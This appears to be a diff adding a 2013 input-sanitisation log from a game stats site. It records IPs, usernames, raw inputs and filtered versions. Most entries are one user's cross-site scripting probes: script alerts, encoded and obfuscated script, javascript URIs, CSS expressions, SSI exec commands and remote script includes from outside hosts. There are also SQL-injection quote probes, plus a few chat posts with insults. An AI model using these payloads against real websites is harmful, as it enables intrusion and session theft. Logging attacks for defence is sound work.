@@ -1,0 +1,237 @@
+Date: 09-07-2013 12:06:43 AM IP: 14.99.118.233 User : sayan123 Code: Dude either u r too dumb, or u r a retard! Do u even understand english? I said...u got my hk's tkt....not "Carl's"....so u sud mention the hks name,n not Carl's :D, Fixed: Dude either u r too dumb, or u r a retard! Do u even understand english? I said...u got my hks tkt....not \"Carls\"....so u sud mention the hks name,n not Carls :D, Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:12:44 AM IP: 125.63.78.194 User : suckcock Code: '';!--"<XSS>=&{()}, Fixed: ;!--\"=&{()}, Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:16:46 AM IP: 125.63.78.194 User : suckcock Code: ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
+alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
+></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>, Fixed: ;alert(String.fromCharCode(88,83,83))//;alert(String.fromCharCode(88,83,83))//\";
+alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--
+>\">>alert(String.fromCharCode(88,83,83)), Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:30:34 AM IP: 125.63.78.194 User : suckcock Code: <IFRAME SRC="javascript:alert('XSS');"></IFRAME>, Fixed: , Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:31:35 AM IP: 125.63.78.194 User : suckcock Code: "";</script><script>alert(0)</script><", Fixed: \"\";alert(0), Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:32:11 AM IP: 125.63.78.194 User : suckcock Code: <IMG SRC=JaVaScRiPt:alert('XSS')>, Fixed: , Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:33:02 AM IP: 125.63.78.194 User : suckcock Code: html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">, Fixed: html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">, Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:34:08 AM IP: 125.63.78.194 User : suckcock Code: <script>eval(String.fromCharCode(60, 115, 99, 114, 105, 112, 116, 62, 97, 108, 101, 114, 116, 40, 49, 41, 59, 60, 47, 115, 99, 114, 105, 112, 116, 62))</script>, Fixed: eval(String.fromCharCode(60, 115, 99, 114, 105, 112, 116, 62, 97, 108, 101, 114, 116, 40, 49, 41, 59, 60, 47, 115, 99, 114, 105, 112, 116, 62)), Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:34:43 AM IP: 125.63.78.194 User : suckcock Code: <iframe>sdfgdfg, Fixed: sdfgdfg, Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:35:41 AM IP: 125.63.78.194 User : suckcock Code: <DIV STYLE="width: »
+expression(alert('XSS'));">, Fixed: , Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:36:19 AM IP: 125.63.78.194 User : suckcock Code: exp/*<XSS »
+STYLE='no\xss:noxss("*//*"); »
+
+xss:&#101;x&#x2F;*XSS*//*/* »
+/pression(alert("XSS"))'>, Fixed: exp/*, Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:37:18 AM IP: 125.63.78.194 User : suckcock Code: <?php, Fixed: , Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:38:41 AM IP: 125.63.78.194 User : suckcock Code: <BGSOUND, Fixed: , Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:39:54 AM IP: 125.63.78.194 User : suckcock Code: ' " > < script > alert(0) < / script>, Fixed:  \" > < script > alert(0) < / script>, Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:40:37 AM IP: 125.63.78.194 User : suckcock Code: <IMG
+SRC
+=
+"
+j
+a
+v
+a
+s
+c
+r
+i »
+
+p
+t
+:
+a
+l
+e
+r
+t
+(
+'
+X
+S
+S
+' »
+
+)
+"
+>, Fixed: , Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:46:39 AM IP: 125.63.78.194 User : suckcock Code: 795935342610', Fixed: 795935342610, Link: http://www.a3ultimate.com/Stats/comments.php
+Date: 09-07-2013 10:46:47 AM IP: 125.63.78.194 User : suckcock Code: 795935342610', Fixed: 795935342610, Link: http://www.a3ultimate.com/Stats/comments.php
+Date: 09-07-2013 10:46:49 AM IP: 125.63.78.194 User : suckcock Code: 52233841088", Fixed: 52233841088\", Link: http://www.a3ultimate.com/Stats/comments.php
+Date: 09-07-2013 10:46:52 AM IP: 125.63.78.194 User : suckcock Code: 52233841088", Fixed: 52233841088\", Link: http://www.a3ultimate.com/Stats/comments.php
+Date: 09-07-2013 10:46:57 AM IP: 125.63.78.194 User : suckcock Code: 938487269650<, Fixed: 938487269650, Link: http://www.a3ultimate.com/Stats/comments.php
+Date: 09-07-2013 10:47:05 AM IP: 125.63.78.194 User : suckcock Code: 938487269650<, Fixed: 938487269650, Link: http://www.a3ultimate.com/Stats/comments.php
+Date: 09-07-2013 10:47:11 AM IP: 125.63.78.194 User : suckcock Code: 938487269650<, Fixed: 938487269650, Link: http://www.a3ultimate.com/Stats/comments.php
+Date: 09-07-2013 10:47:12 AM IP: 125.63.78.194 User : suckcock Code: 1311539444495\, Fixed: 1311539444495, Link: http://www.a3ultimate.com/Stats/comments.php
+Date: 09-07-2013 10:47:13 AM IP: 125.63.78.194 User : suckcock Code: 1311539444495\, Fixed: 1311539444495, Link: http://www.a3ultimate.com/Stats/comments.php
+Date: 09-07-2013 10:47:33 AM IP: 125.63.78.194 User : suckcock Code: 
+<div datafld="b" dataformatas="html" datasrc="#X"></div>
+, Fixed: 
+
+, Link: http://www.a3ultimate.com/Stats/comments.php
+Date: 09-07-2013 10:47:37 AM IP: 125.63.78.194 User : suckcock Code: 
+<xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
+, Fixed: 
+document.vulnerable=true;;
+, Link: http://www.a3ultimate.com/Stats/comments.php
+Date: 09-07-2013 10:52:40 AM IP: 125.63.78.194 User : suckcock Code: "><i/style="background:url(javascript:a=\"<scr\"+\"ipt%20src=http://site.com/1.js></script>\")">, Fixed: \">, Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:54:10 AM IP: 125.63.78.194 User : suckcock Code: </a/style=color:expression(location.href='ht'+'tp://google.com');%0d>, Fixed: , Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:55:08 AM IP: 125.63.78.194 User : suckcock Code: </script>asd, Fixed: asd, Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:56:07 AM IP: 125.63.78.194 User : suckcock Code: <!--[if gte IE »
+4]>
+<SCRIPT>alert('XSS');</S »
+CRIPT>
+<![endif]-->, Fixed: , Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:56:24 AM IP: 125.63.78.194 User : suckcock Code: '"><!--, Fixed: \">, Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:56:57 AM IP: 125.63.78.194 User : suckcock Code: <BR SIZE="&{alert('XSS')}">, Fixed: , Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:57:33 AM IP: 125.63.78.194 User : suckcock Code: <LINK REL="stylesheet" HREF="javascript:alert('XSS');">, Fixed: , Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:58:52 AM IP: 125.63.78.194 User : suckcock Code: <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>, Fixed: @importhttp://ha.ckers.org/xss.css;, Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:59:21 AM IP: 125.63.78.194 User : suckcock Code: <XSS STYLE="behavior: url(xss.htc);">, Fixed: , Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:59:42 AM IP: 125.63.78.194 User : suckcock Code: <!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'"-->, Fixed: , Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 11:00:20 AM IP: 125.63.78.194 User : suckcock Code: <
+%3C
+&lt
+&lt;
+&LT
+&LT;
+&#60
+&#060
+&#0060
+&#00060
+&#000060
+&#0000060
+&#60;
+&#060;
+&#0060;
+&#00060;
+&#000060;
+&#0000060;
+&#x3c
+&#x03c
+&#x003c
+&#x0003c
+&#x00003c
+&#x000003c
+&#x3c;
+&#x03c;
+&#x003c;
+&#x0003c;
+&#x00003c;
+&#x000003c;
+&#X3c
+&#X03c
+&#X003c
+&#X0003c
+&#X00003c
+&#X000003c
+&#X3c;
+&#X03c;
+&#X003c;
+&#X0003c;
+&#X00003c;
+&#X000003c;
+&#x3C
+&#x03C
+&#x003C
+&#x0003C
+&#x00003C
+&#x000003C
+&#x3C;
+&#x03C;
+&#x003C;
+&#x0003C;
+&#x00003C;
+&#x000003C;
+&#X3C
+&#X03C
+&#X003C
+&#X0003C
+&#X00003C
+&#X000003C
+&#X3C;
+&#X03C;
+&#X003C;
+&#X0003C;
+&#X00003C;
+&#X000003C;
+\x3c
+\x3C
+\u003c
+\u003C, Fixed: <
+%3C
+&lt
+&lt;
+&LT
+&LT;
+&#60
+&#060
+&#0060
+&#00060
+&#000060
+&#0000060
+&#60;
+&#060;
+&#0060;
+&#00060;
+&#000060;
+&#0000060;
+&#x3c
+&#x03c
+&#x003c
+&#x0003c
+&#x00003c
+&#x000003c
+&#x3c;
+&#x03c;
+&#x003c;
+&#x0003c;
+&#x00003c;
+&#x000003c;
+&#X3c
+&#X03c
+&#X003c
+&#X0003c
+&#X00003c
+&#X000003c
+&#X3c;
+&#X03c;
+&#X003c;
+&#X0003c;
+&#X00003c;
+&#X000003c;
+&#x3C
+&#x03C
+&#x003C
+&#x0003C
+&#x00003C
+&#x000003C
+&#x3C;
+&#x03C;
+&#x003C;
+&#x0003C;
+&#x00003C;
+&#x000003C;
+&#X3C
+&#X03C
+&#X003C
+&#X0003C
+&#X00003C
+&#X000003C
+&#X3C;
+&#X03C;
+&#X003C;
+&#X0003C;
+&#X00003C;
+&#X000003C;
+x3c
+x3C
+u003c
+u003C, Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 11:23:09 AM IP: 125.63.78.194 User : suckcock Code: 97023103'", Fixed: 97023103\", Link: http://www.a3ultimate.com/Stats/comments.php
+Date: 09-07-2013 11:23:13 AM IP: 125.63.78.194 User : suckcock Code: 97023103'", Fixed: 97023103\", Link: http://www.a3ultimate.com/Stats/comments.php
+Date: 09-07-2013 11:23:16 AM IP: 125.63.78.194 User : suckcock Code: 97023103'", Fixed: 97023103\", Link: http://www.a3ultimate.com/Stats/comments.php
+Date: 09-07-2013 11:23:35 AM IP: 125.63.78.194 User : suckcock Code: 97023103'", Fixed: 97023103\", Link: http://www.a3ultimate.com/Stats/comments.php
+Date: 09-07-2013 02:57:59 PM IP: 125.63.78.194 User : suckcock Code: <audio src=1 href=1 onerror="%(eval_payload)s"></audio>, Fixed: , Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 09:58:39 PM IP: 14.96.61.38 User : sayan123 Code: Bhikari barker down :(
+
+S<<< towels,napkins,burnols in bulk...pm me, Fixed: Bhikari barker down :(
+
+S, Link: http://www.a3ultimate.com/Stats/insertajax.php
+Date: 09-07-2013 10:02:15 PM IP: 14.96.61.38 User : sayan123 Code: I request u all nt to post GGR's tkts...the gallery is gettin spammed!! WTF :/, Fixed: I request u all nt to post GGRs tkts...the gallery is gettin spammed!! WTF :/, Link: http://www.a3ultimate.com/Stats/insertajax.php
